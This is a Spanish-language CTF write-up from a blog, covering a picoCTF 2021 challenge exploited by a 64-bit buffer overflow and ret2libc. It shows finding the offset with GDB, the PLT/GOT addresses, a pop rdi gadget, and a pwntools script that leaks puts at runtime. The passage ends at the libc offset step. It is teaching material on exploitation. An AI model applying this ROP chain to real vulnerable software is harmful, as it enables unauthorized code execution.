<!doctype html><html lang="es"><head><title>Here's a LIBC | 7Rocky</title>
<meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><meta name="author" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta name="description" content="picoCTF 2021. 90 puntos. Binario de 64 bits. Buffer Overflow. Ret2Libc"><meta name="image" content="https://7rocky.github.io/images/pwn.png"><meta name="robots" content="index, follow"><meta name="viewport" content="width=device-width,minimum-scale=1"><meta itemprop="description" content="picoCTF 2021. 90 puntos. Binario de 64 bits. Buffer Overflow. Ret2Libc"><meta itemprop="keywords" content><meta itemprop="name" content="Here's a LIBC"><meta property="article:published_time" content><meta property="og:author" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta property="og:description" content="picoCTF 2021. 90 puntos. Binario de 64 bits. Buffer Overflow. Ret2Libc"><meta property="og:image" content="https://7rocky.github.io/images/pwn.png"><meta property="og:locale" content="es_ES"><meta property="og:site_name" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta property="og:title" content="Here's a LIBC"><meta property="og:type" content="website"><meta property="og:url" content="https://7rocky.github.io/ctf/picoctf/binary-exploitation/heres-a-libc/"><meta name="twitter:author" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta name="twitter:card" content="picoCTF 2021. 90 puntos. Binario de 64 bits. Buffer Overflow. Ret2Libc"><meta name="twitter:description" content="picoCTF 2021. 90 puntos. Binario de 64 bits. Buffer Overflow. Ret2Libc"><meta name="twitter:image" content="https://7rocky.github.io/images/pwn.png"><meta name="twitter:title" content="Here's a LIBC"><link href="/favicon.ico" rel="shortcut icon" type="image/x-icon"><link href="/css/style.css" rel="stylesheet"><link href="/css/main.css" rel="stylesheet"><link href="/css/code.css" rel="stylesheet"><link href="https://7rocky.github.io/ctf/picoctf/binary-exploitation/heres-a-libc/" rel="canonical"><script async src="https://www.googletagmanager.com/gtag/js?id=G-Z1HQGH3M4D"></script><script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-Z1HQGH3M4D",{anonymize_ip:!1})}</script></head><body class="ma0 production"><header style="position:sticky;top:0;z-index:9"><div class="bg-black"><nav class="ph4-ns" id="navigation" role="navigation"><div class="flex-l justify-between items-center center"><a class="f3 fw2 hover-white no-underline white-90 dib" href="/" title="7Rocky">7Rocky</a><div class="flex-l items-center"><a href="/search" target class="link-transition link dib z-999 pt3 pt0-l mr1 search-link" title="Buscar" rel="noopener" aria-label="Buscar"><svg height="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 487.95 487.95" style="enable-background:new 0 0 487.95 487.95"><g><g><path d="M481.8 453l-140-140.1c27.6-33.1 44.2-75.4 44.2-121.6C386 85.9 299.5.2 193.1.2S0 86 0 191.4s86.5 191.1 192.9 191.1c45.2.0 86.8-15.5 119.8-41.4l140.5 140.5c8.2 8.2 20.4 8.2 28.6.0C490 473.4 490 461.2 481.8 453zM41 191.4c0-82.8 68.2-150.1 151.9-150.1s151.9 67.3 151.9 150.1-68.2 150.1-151.9 150.1S41 274.1 41 191.4z" style="fill-rule:evenodd;clip-rule:evenodd;fill:#a9a9b3"/></g></g><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/></svg></a><a class="link-transition lang link dib z-999 pt3 pt0-l mr3" href="#" title="es"><img alt="es" height="30px" src="/images/es.png" width="30px">
</a><a class="link-transition lang link dib z-999 pt3 pt0-l" href="/en/ctf/picoctf/binary-exploitation/heres-a-libc/" title="en"><img alt="en" height="30px" src="/images/en.png" style="border:4px solid#000;border-radius:100%" width="30px"></a><ul class="pl0 ml3 mr3" style="line-height:30px"><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/ctf/" title="CTF">CTF</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/htb/" title="HTB">HTB</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/imc/" title="IMC">IMC</a></li></ul><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn——Opens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub——Opens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></nav></div></header><main class="pb5" role="main" style="min-height:720px"><article class="flex-l flex-wrap justify-between mw8 center ph3"><header class="mt4 w-80-l"><a aria-label="aside" class="instapaper_ignoref b tracked" href="../" style="font-size:1.2rem">&lt;- EXPLOTACIÓN DE BINARIOS</a><div id="sharing" class="mt3"><a aria-label="share on Facebook" class="facebook no-underline" href="https://www.facebook.com/sharer.php?u=https://7rocky.github.io/ctf/picoctf/binary-exploitation/heres-a-libc/" title="share on Facebook"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M28.765 50.32h6.744V33.998h4.499l.596-5.624h-5.095l.007-2.816c0-1.466.14-2.253 2.244-2.253h2.812V17.68h-4.5c-5.405.0-7.307 2.729-7.307 7.317v3.377h-3.369v5.625h3.369V50.32zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd"/></svg></a><a aria-label="share on Twitter" class="twitter no-underline" href="https://twitter.com/share?url=https://7rocky.github.io/ctf/picoctf/binary-exploitation/heres-a-libc/&amp;text=Here%27s%20a%20LIBC" title="share on Twitter"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M37.167 22.283c-2.619.953-4.274 3.411-4.086 6.101l.063 1.038-1.048-.127c-3.813-.487-7.145-2.139-9.974-4.915l-1.383-1.377-.356 1.017c-.754 2.267-.272 4.661 1.299 6.271.838.89.649 1.017-.796.487-.503-.169-.943-.296-.985-.233-.146.149.356 2.076.754 2.839.545 1.06 1.655 2.097 2.871 2.712l1.027.487-1.215.021c-1.173.0-1.215.021-1.089.467.419 1.377 2.074 2.839 3.918 3.475l1.299.444-1.131.678c-1.676.976-3.646 1.526-5.616 1.568C19.775 43.256 19 43.341 19 43.405c0 .211 2.557 1.397 4.044 1.864 4.463 1.377 9.765.783 13.746-1.568 2.829-1.673 5.657-5 6.978-8.221.713-1.716 1.425-4.851 1.425-6.354.0-.975.063-1.102 1.236-2.267.692-.678 1.341-1.419 1.467-1.631.21-.403.188-.403-.88-.043-1.781.636-2.033.551-1.152-.402.649-.678 1.425-1.907 1.425-2.267.0-.063-.314.042-.671.233-.377.212-1.215.53-1.844.72l-1.131.361-1.027-.7c-.566-.381-1.361-.805-1.781-.932C39.766 21.902 38.131 21.944 37.167 22.283zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a><a aria-label="share on LinkedIn" class="linkedin no-underline" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https://7rocky.github.io/ctf/picoctf/binary-exploitation/heres-a-libc/&amp;title=Here%27s%20a%20LIBC" title="share on LinkedIn"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a></div><h1 class="f1 mt3 mb1">Here's a LIBC</h1><p class="mb4 f6 dib tracked">9 minutos de lectura</p></header><div class="nested-copy-line-height lh-copy serif f4 nested-links nested-img pr4-l w-80-l"><p>Se nos proporciona un binario de 64 bits llamado <code>vuln</code> y un archivo <code>libc.so.6</code> como librería externa:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">Arch:     amd64-64-little
RELRO:    <span class="code-dark-yellow">Partial RELRO</span>
Stack:    <span class="code-dark-red">No canary found</span>
NX:       <span class="code-dark-green">NX enabled</span>
PIE:      <span class="code-dark-red">No PIE (0x400000)</span>  
RUNPATH:  <span class="code-dark-red">b'./'</span>
</code></pre></div><p>Si ejecutamos el binario obtendremos una violación de segmento (<em>segmentation fault</em>):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">chmod</span> +x <span class="mtku">vuln</span>

<span class="code-cyan">$</span> <span class="code-dark-green">./vuln</span>
zsh: segmentation fault (core dumped)  ./vuln  
</code></pre></div><p>Está configurado para utilizar Glibc desde el directorio actual:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">ldd</span> <span class="mtku">vuln</span>
        linux-vdso.so.1 (0x00007ffdc3195000)
        libc.so.6 => ./libc.so.6 (0x00007ff93c204000)
        /lib64/ld-linux-x86-64.so.2 (0x00007ff93c5f7000)  
</code></pre></div><p>Usaremos <a href="https://github.com/io12/pwninit"><code>pwninit</code></a> para parchear el binario y hacer que funcione:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">pwninit</span> --libc <span class="mtku">libc.so.6</span> --no-template --bin <span class="mtku">vuln</span>
<span class="code-dark-blue">bin</span>: <span class="code-blue">vuln</span>
<span class="code-dark-yellow">libc</span>: <span class="code-yellow">libc.so.6</span>

<span class="code-green">fetching linker</span>
<span class="code-green">https://launchpad.net/ubuntu/+archive/primary/+files//libc6_2.27-3ubuntu1.2_amd64.deb</span>
<span class="code-yellow">unstripping libc</span>
<span class="code-green">https://launchpad.net/ubuntu/+archive/primary/+files//libc6-dbg_2.27-3ubuntu1.2_amd64.deb</span>  
<span class="code-dark-green">setting <span class="code-green">./ld-2.27.so</span> executable</span>
<span class="code-dark-green">copying <span class="code-green">vuln</span> to <span class="code-green">vuln_patched</span></span>
<span class="code-dark-green">running patchelf on <span class="code-green">vuln_patched</span></span>
</code></pre></div><p>Y ahora funciona:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">./vuln_patched</span>
WeLcOmE To mY EcHo sErVeR!  
asdf
AsDf
</code></pre></div><p>El programa está tomando la entrada de usuario y transformando las letras a mayúsculas y minúsculas alternativamente. Vamos a ver si es vulnerable a <em>Buffer Overflow</em>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> -c <span class="code-dark-yellow">'print("A" * 300)'</span> | <span class="code-dark-green">./vuln_patched</span>
WeLcOmE To mY EcHo sErVeR!
AaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAAAAAAAAAAAAAAAAAAAAd  
zsh: done                              python3 -c 'print("A" * 300)' |
zsh: segmentation fault (core dumped)  ./vuln_patched
</code></pre></div><p>Y es vulnerable ya que el programa se rompe, que significa que la dirección de retorno se ha modificado. Podemos utilizar GDB para obtener el número exacto de caracteres necesarios para modificar la dirección de retorno:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">gdb</span> -q <span class="mtku">vuln_patched</span>
Reading symbols from <span class="code-dark-green">vuln_patched</span>...
(No debugging symbols found in <span class="code-dark-green">vuln_patched</span>)
<span class="code-red">gef➤</span>  pattern create 300
<span class="code-blue">[+]</span> Generating a pattern of 300 bytes (n=8)
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaa  
aauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaaablaaaaaabmaaa
<span class="code-green">[+]</span> Saved as '$_gef0'
<span class="code-red">gef➤</span>  run
Starting program: ./vuln_patched
WeLcOmE To mY EcHo sErVeR!
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaa
aauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaaablaaaaaabmaaa
AaAaAaAaBaAaAaAaCaAaAaAaDaAaAaAaEaAaAaAaFaAaAaAaGaAaAaAaHaAaAaAaIaAaAaAaJaAaAaAaKaAaAaAaLaAaAaAaMaAaaaaanaaaaaaaoaaaaaaad

Program received signal SIGSEGV, Segmentation fault.
<span class="code-dark-blue">0x0000000000400770</span> in <span class="code-dark-yellow">do_stuff</span> ()
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef➤</span>  pattern offset $rsp
<span class="code-blue">[+]</span> Searching for '$rsp'
<span class="code-green">[+]</span> Found at offset 136 (little-endian search) <span class="code-red">likely</span>  
<span class="code-green">[+]</span> Found at offset 129 (big-endian search)
</code></pre></div><p>Vemos que necesitamos 136 caracteres antes de modificar el registro <code>$rsp</code> (donde se almacena la dirección de retorno antes de llamar a una función).</p><p>Como el binario tiene la protección NX, necesitamos utilizar <em>Return Oriented Programming</em> (ROP) para explotar la vulnerabilidad. Además, tendremos que burlar el ASLR porque probablemente estará habilitado en la instancia remota.</p><p>Para poder burlar el ASLR, necesitamos fugar una dirección de Glibc en tiempo de ejecución, de manera que podamos calcular la dirección base de la librería y obtener la dirección real de <code>system</code> y <code>"/bin/sh"</code> (esta técnica se conoce como Ret2Libc).</p><p>Como tenemos un <em>Buffer Overflow</em>, tenemos control de la siguiente dirección que se va a ejecutar. Por tanto, podemos llamar a una función como <code>puts</code> para mostrar la dirección de otra función. Para llamar a <code>puts</code> tenemos que usar la dirección de <code>puts</code> en la Tabla de Enlaces a Procedimientos (<em>Procedure Linkage Table</em>, PLT). Esta función muestra el primer argumento como una cadena de caracteres (por lo que imprime el contenido de una dirección dada hasta encontrar un carácter nulo). Por tanto, el argumento para <code>puts</code> será la dirección de una función en la Tabla de <em>Offsets</em> Globales (<em>Global Offset Table</em>, GOT), que contiene la dirección real de una función si esta ya ha sido resuelta.</p><p>Debido a la convención de llamadas a funciones en 64 bits, tenemos que poner el primer parámetro en el registro <code>$rdi</code> antes de llamar a la función.</p><p>Para ello, usaremos <em>gadgets</em>. Estos son secuencias de instrucciones en ensamblador que terminan en <code>ret</code>, por lo que al ejecutarse, vuelven a la pila (<em>stack</em>), donde estará el siguiente <em>gadget</em> o la siguiente llamada a función. De ahí el nombre de la técnica ROP, estamos ejecutando código de direcciones específicas del binario y volviendo al siguiente. La secuencia de <em>gadgets</em> empleada durante la explotación se conoce comúnmente como ROP <em>chain</em> y nos permite burlar la protección NX.</p><p>Vamos a encontrar toda la información que necesitamos para la explotación:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">objdump</span> -d <span class="mtku">vuln</span> | <span class="code-dark-green">grep</span> puts
0000000000400540 &lt;<span class="code-red">puts</span>@plt&gt;:
  400540:       ff 25 d2 0a 20 00       jmpq   *0x200ad2(%rip)        # 601018 &lt;<span class="code-red">puts</span>@GLIBC_2.2.5&gt;  
  400769:       e8 d2 fd ff ff          callq  400540 &lt;<span class="code-red">puts</span>@plt&gt;
  400891:       e8 aa fc ff ff          callq  400540 &lt;<span class="code-red">puts</span>@plt&gt;
</code></pre></div><p>Aquí tenemos <code>puts</code> en la PLT (<code>0x400540</code>) y <code>puts</code> en la GOT (<code>0x601018</code>). La dirección de <code>puts</code> en la GOT también se puede obtener con <code>readelf</code> y con otro parámetro de <code>objdump</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">objdump</span> -R <span class="mtku">vuln</span> | <span class="code-dark-green">grep</span> puts
0000000000601018 R_X86_64_JUMP_SLOT  <span class="code-red">puts</span>@GLIBC_2.2.5

<span class="code-cyan">$</span> <span class="code-dark-green">readelf</span> -r <span class="mtku">vuln</span> | <span class="code-dark-green">grep</span> puts
000000601018  000100000007 R_X86_64_JUMP_SLO 0000000000000000 <span class="code-red">puts</span>@GLIBC_2.2.5 + 0  
</code></pre></div><p>Ahora tenemos que encontrar un <em>gadget</em> que ponga la dirección de <code>puts</code> en la GOT en el registro <code>$rdi</code>. Un <em>gadget</em> útil puede ser <code>pop rdi; ret</code>, el cual toma un valor de la pila y lo pone en <code>$rdi</code>. Vamos a buscarlo con <code>ROPgadget</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">ROPgadget</span> --binary <span class="mtku">vuln</span> | <span class="code-dark-green">grep</span> <span class="code-dark-yellow">'pop rdi ; ret'</span>  
0x0000000000400913 : <span class="code-red">pop rdi ; ret</span>
</code></pre></div><p>Un último dato que necesitamos es la dirección del <code>main</code>. Esto es necesario para indicar la última función que se va a llamar en la ROP <em>chain</em>, de manera que podemos reiniciar el programa sin cerrar el proceso:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">readelf</span> -s <span class="mtku">vuln</span> | <span class="code-dark-green">grep</span> main$
    63: 0000000000400771   305 FUNC    GLOBAL DEFAULT   13 <span class="code-red">main</span>  
</code></pre></div><p>Podemos escribir este <em>script</em> en Python para explotar el binario:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk3">#!/usr/bin/env</span> <span class="mtk3">python3</span>

<span class="mtk5">from</span> <span class="mtk8 mtku">pwn</span> <span class="mtk5">import *</span>


<span class="mtk1">context</span><span class="mtk1">.</span><span class="mtk1">binary</span> <span class="mtk5">=</span> <span class="mtk1">elf</span> <span class="mtk5">=</span> <span class="mtk8 mtku">ELF</span><span class="mtk1">(</span><span class="mtk4">'vuln_patched'</span><span class="mtk1">)</span>
<span class="mtk1">glibc</span> <span class="mtk5">=</span> <span class="mtk8 mtku">ELF</span><span class="mtk1">(</span><span class="mtk4">'libc.so.6'</span><span class="mtk1">,</span> <span class="mtk9 mtki">checksec</span><span class="mtk5">=</span><span class="mtk6">False</span><span class="mtk1">)</span>


<span class="mtk7 mtki">def</span> <span class="mtk8">get_process</span><span class="mtk1">():</span>
    <span class="mtk5">if</span> <span class="mtk8">len</span><span class="mtk1">(</span><span class="mtk8 mtku">sys</span><span class="mtk1">.</span><span class="mtk1">argv</span><span class="mtk1">)</span> <span class="mtk5">==</span> <span class="mtk6">1</span><span class="mtk1">:</span>
        <span class="mtk5">return</span> <span class="mtk1">elf</span><span class="mtk1">.</span><span class="mtk8">process</span><span class="mtk1">()</span>

    <span class="mtk1">host</span><span class="mtk1">,</span> <span class="mtk1">port</span> <span class="mtk5">=</span> <span class="mtk8 mtku">sys</span><span class="mtk1">.</span><span class="mtk1">argv</span><span class="mtk1">[</span><span class="mtk6">1</span><span class="mtk1">],</span> <span class="mtk8 mtku">int</span><span class="mtk1">(</span><span class="mtk8 mtku">sys</span><span class="mtk1">.</span><span class="mtk1">argv</span><span class="mtk1">[</span><span class="mtk6">2</span><span class="mtk1">])</span>
    <span class="mtk5">return</span> <span class="mtk8 mtku">remote</span><span class="mtk1">(</span><span class="mtk1">host</span><span class="mtk1">,</span> <span class="mtk1">port</span><span class="mtk1">)</span>


<span class="mtk7 mtki">def</span> <span class="mtk8">main</span><span class="mtk1">():</span>
    <span class="mtk1">p</span> <span class="mtk5">=</span> <span class="mtk8">get_process</span><span class="mtk1">()</span>

    <span class="mtk1">offset</span> <span class="mtk5">=</span> <span class="mtk6">136</span>
    <span class="mtk1">junk</span> <span class="mtk5">=</span> <span class="mtk7 mtki">b</span><span class="mtk4">'A'</span> <span class="mtk5">*</span> <span class="mtk1">offset</span>

    <span class="mtk1">pop_rdi_ret</span> <span class="mtk5">=</span> <span class="mtk7 mtki">0x</span><span class="mtk6">400913</span>
    <span class="mtk1">puts_got</span> <span class="mtk5">=</span> <span class="mtk7 mtki">0x</span><span class="mtk6">601018</span>
    <span class="mtk1">puts_plt</span> <span class="mtk5">=</span> <span class="mtk7 mtki">0x</span><span class="mtk6">400540</span>
    <span class="mtk1">main_addr</span> <span class="mtk5">=</span> <span class="mtk7 mtki">0x</span><span class="mtk6">400771</span>

    <span class="mtk1">payload</span>  <span class="mtk5">=</span> <span class="mtk1">junk</span>
    <span class="mtk1">payload</span> <span class="mtk5">+=</span> <span class="mtk1">p64(</span><span class="mtk1">pop_rdi_ret</span><span class="mtk1">)</span>
    <span class="mtk1">payload</span> <span class="mtk5">+=</span> <span class="mtk1">p64(</span><span class="mtk1">puts_got</span><span class="mtk1">)</span>
    <span class="mtk1">payload</span> <span class="mtk5">+=</span> <span class="mtk1">p64(</span><span class="mtk1">puts_plt</span><span class="mtk1">)</span>
    <span class="mtk1">payload</span> <span class="mtk5">+=</span> <span class="mtk1">p64(</span><span class="mtk1">main_addr</span><span class="mtk1">)</span>

    <span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'WeLcOmE</span> <span class="mtk4">To</span> <span class="mtk4">mY</span> <span class="mtk4">EcHo</span> <span class="mtk4">sErVeR!</span><span class="mtk6">\n</span><span class="mtk4">'</span><span class="mtk1">,</span> <span class="mtk1">payload</span><span class="mtk1">)</span>  
    <span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">recvline</span><span class="mtk1">()</span>

    <span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">interactive</span><span class="mtk1">()</span>


<span class="mtk5">if</span> <span class="mtk1">__name__</span> <span class="mtk5">==</span> <span class="mtk4">'__main__'</span><span class="mtk1">:</span>
    <span class="mtk8">main</span><span class="mtk1">()</span>
</code></pre></div><p>Si lo ejecutamos, vemos que fugamos la dirección de <code>puts</code> en tiempo de ejecución y el <code>main</code> se vuelve a ejecutar:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span>
[<span class="code-blue">*</span>] './vuln_patched'
    Arch:     amd64-64-little
    RELRO:    <span class="code-dark-yellow">Partial RELRO</span>
    Stack:    <span class="code-dark-red">No canary found</span>
    NX:       <span class="code-dark-green">NX enabled</span>
    PIE:      <span class="code-dark-red">No PIE (0x400000)</span>
    RUNPATH:  <span class="code-dark-red">b'.'</span>
[<span class="code-green">+</span>] Starting local process './vuln_patched': pid 143772  
[<span class="code-blue">*</span>] Switching to interactive mode
0\x1a\x90\xa6\x7f
WeLcOmE To mY EcHo sErVeR!
<span class="code-red">$</span>
</code></pre></div><p>Para poder calcular la dirección base de Glibc en tiempo de ejecución, tenemos que restar el <em>offset</em> de <code>puts</code> en Glibc a su dirección en tiempo de ejecución. El <em>offset</em> de <code>puts</code> es <code>0x80a30</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">readelf</span> -s <span class="mtku">libc.so.6</span> | <span class="code-dark-green">grep</span> <span class="code-dark-yellow">' puts$'</span>
  7481: 0000000000080a30   512 FUNC    WEAK   DEFAULT   13 <span class="code-red">puts</span>  
